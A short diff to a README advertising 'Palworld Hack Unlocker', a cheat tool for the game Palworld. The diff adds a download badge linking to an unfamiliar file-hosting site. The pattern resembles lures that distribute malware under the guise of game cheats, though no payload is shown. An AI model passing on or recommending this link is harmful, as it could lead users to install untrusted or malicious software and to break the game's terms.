@@ -10,3 +10,5 @@ Palworld Hack Unlocker is a powerful tool designed to enhance your gameplay by u
 5. **Easy to Use**: Simple interface that allows you to unlock features quickly and efficiently.  
 
 Palworld Hack Unlocker is perfect for players who want to explore all the possibilities of the game and enjoy a fully customized, unrestricted gaming experience!
+
+[![Download PalWorld HackUnlocker](https://img.shields.io/badge/Download-PalWorld%20HackUnlocker-blueviolet)](https://downeefiles.com/s/palwrldhck)
